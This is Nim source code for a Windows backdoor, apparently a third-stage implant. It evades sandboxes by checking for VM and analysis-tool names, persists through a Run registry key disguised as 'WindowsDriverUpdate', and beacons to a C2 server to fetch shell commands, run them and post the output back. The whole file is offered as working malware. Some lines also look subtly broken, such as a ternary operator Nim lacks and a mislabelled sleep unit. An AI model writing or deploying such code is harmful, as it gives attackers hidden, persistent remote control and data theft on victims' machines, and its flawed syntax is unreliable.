# stage3.nim – advanced Nim backdoor with AV evasion and C2

import winim/lean, os, strutils, base64, httpclient, times

# ========== CONFIGURATION ==========
const
  C2_HOST = defined(c2host) ? c2host : "127.0.0.1"
  C2_PORT = defined(c2port) ? Port(parseInt(c2port)) : Port(443)
  BEACON_INTERVAL = 90  # seconds
  USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# ========== UTILS ==========
proc sleepMS(ms: int) =
  sleep(ms * 1000)

# Check if running in VM / analysis env
proc isSandboxed(): bool =
  let suspicious = ["VBox", "vmware", "wireshark", "fiddler", "procmon"]
  for s in suspicious:
    if existsEnv(s) or getEnv("COMPUTERNAME").toLowerAscii().contains(s.toLowerAscii()):
      return true
  return false

# Registry persistence
proc setPersistence() =
  let exePath = getCurrentExe()
  let runKey = r"Software\Microsoft\Windows\CurrentVersion\Run"
  let valName = "WindowsDriverUpdate"
  let hKey = HKEY_CURRENT_USER
  var key: HKEY
  if RegCreateKeyEx(hKey, runKey, 0, nil, 0, KEY_WRITE, nil, addr key, nil) == ERROR_SUCCESS:
    discard RegSetValueEx(key, valName, 0, REG_SZ, cast[LPBYTE](exePath), DWORD(len(exePath)))
    RegCloseKey(key)

# C2 communication with headers
proc fetchCommand(): string =
  let client = newHttpClient()
  client.headers = {"User-Agent": USER_AGENT}.newHttpHeaders()
  try:
    return client.getContent("https://" & C2_HOST & ":" & $C2_PORT & "/cmd")
  except:
    return ""

proc sendResult(result: string) =
  let client = newHttpClient()
  client.headers = {"User-Agent": USER_AGENT}.newHttpHeaders()
  try:
    discard client.postContent("https://" & C2_HOST & ":" & $C2_PORT & "/result", result)
  except:
    discard

# Command execution
proc runCommand(cmd: string): string =
  try:
    let out = execProcess(cmd, options={poUsePath, poStdErrToStdOut})
    return out
  except:
    return "<error>"

# ========== MAIN LOOP ==========
proc main() =
  if isSandboxed():
    quit(0)
  setPersistence()

  while true:
    let cmd = fetchCommand()
    if cmd.len > 0:
      let output = runCommand(cmd)
      sendResult(output)
    sleepMS(BEACON_INTERVAL)

when isMainModule:
  main()
